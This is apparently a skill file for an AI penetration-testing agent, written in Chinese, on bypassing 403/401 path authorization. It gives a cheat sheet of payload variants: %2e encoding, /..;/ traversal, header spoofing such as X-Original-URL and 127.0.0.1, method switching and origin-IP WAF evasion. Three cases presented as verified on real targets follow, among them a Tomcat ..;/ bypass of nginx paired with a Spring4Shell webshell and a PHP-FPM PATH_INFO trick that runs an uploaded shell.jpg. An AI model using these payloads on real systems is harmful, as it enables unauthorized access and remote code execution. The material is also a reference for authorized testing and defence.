---
name: path-403-bypass
description: >-
  403/路径鉴权绕过:%2e 编码,分号与 /..;/ 路径参数,大小写/双斜杠/尾缀变形,X-Original-URL 头,方法变换,Host 直指源站。Use when a path returns 403/401 and you need path-traversal style auth bypass variants before declaring it dead.
  触发：403绕过,401绕过,路径鉴权绕过,2e编码,分号绕过,穿越,X-Original-URL,Host直指源站
metadata:
  roles: [Web与API安全测试, 渗透测试]
  stages: [web]
  tags: [渗透测试, penetration-testing, 红队]
---

## 403 / 路径鉴权绕过

```
=== 403 bypass ===
路径变形: %2e(%2e%2e%2f) | 分号 /;;/ | /..;/ (Spring/Tomcat off-by-slash) | //双斜杠 | /./ | 尾斜杠 /admin/ ↔ /admin
大小写/后缀: /ADMIN /Admin | /admin.json /admin.css /admin%20 /admin.. /admin? | /api/v1/../admin
路径参数: /admin;param=value (Spring 矩阵变量) | /admin;x=1/admin
头注入: X-Original-URL / X-Rewrite-URL: https://target/admin | X-Forwarded-For/X-Real-IP: 127.0.0.1 | X-Custom-IP-Authorization | Referer/Origin 改站内
方法变换: GET→POST/PUT/HEAD/PATCH | 目录 403 试具体文件 /admin/index.html /admin/main.js
绕反代/CDN: 证书透明度/历史 DNS/子域猜解找源站 IP → Host 头直指源站跳过 WAF 层
判死纪律: 变形至少过一整轮(编码/分号/头/方法各试) + SPA 兜底校验(200 但内容同首页 → Accept: application/json 重打对照)才判 dead;判死记 pathfamily/<host>/<族名>=dead Fact 不再重探
```

## 本平台实战案例（真实目标验证）

### 案例1：Tomcat `..;/` 绕过 nginx 路径限制

```
🚨Tomcat ..;/ 绕过nginx路径限制: nginx不解析URL中的;(视为路径一部分)但Tomcat把..;/当路径穿越:
  /api/v1/v/..;/admin/path → nginx匹配/api/v1/v/(放行) → Tomcat解析为/admin/path(穿越!)
  验证: 正常/admin返回nginx 403, 用/api/v1/v/..;/admin返回Tomcat 404 = 绕过成功
  限制: Spring MVC DispatcherServlet路由独立于文件系统,只能访问同war内静态文件/非MVC路径
  组合: 配合Spring4Shell写入的JSP webshell, 或访问actuator端点
```
要点：判据是「响应来源变了」（nginx 403 → Tomcat 404/200），说明请求穿透了前置代理。返回 Tomcat 404 也**算成功**（已到达后端）。

### 案例2：PATH_INFO 绕过 nginx deny（PHP-FPM）

```
🚨PATH_INFO nginx deny bypass: nginx deny .php文件(返回146B nginx 404)但PHP-FPM通过PATH_INFO仍可达:
  /denied/file.php → 404|146(nginx拦截) | /denied/file.php/ → 16B "File not found."(PHP-FPM执行!)
  /denied/file.php/x → 同上。PHP-FPM返回"File not found."说明请求穿透了nginx deny到了PHP-FPM(只是脚本路径不对)
  利用: 如果PHP配置cgi.fix_pathinfo=1(默认), /uploads/shell.jpg/x.php → PHP执行shell.jpg! | 确认存在后找FPM实际docroot(可能与nginx不同)
  识别: nginx deny返回固定大小(146B标准404), PHP-FPM返回16B "File not found." → 大小差异即突破信号
```

### 案例3：响应大小指纹找隐藏文件

```
🚨响应大小指纹(隐藏文件发现): CMS catch-all路由返回固定大小首页(如44004B), nginx真实404返回146B
  文件存在但被deny: 返回146B(nginx 404) | 文件不存在: 返回catch-all大小(44004B) | → 146B=文件确实存在!
  方法: 批量扫描路径,按响应大小分类: catch-all=不存在, nginx404=存在但被禁, 其他大小=可访问
```
要点：不要只按状态码分类（都是 404），要按**响应体大小**分类 —— 能区分「不存在 / 存在但被禁 / 可访问」三态。
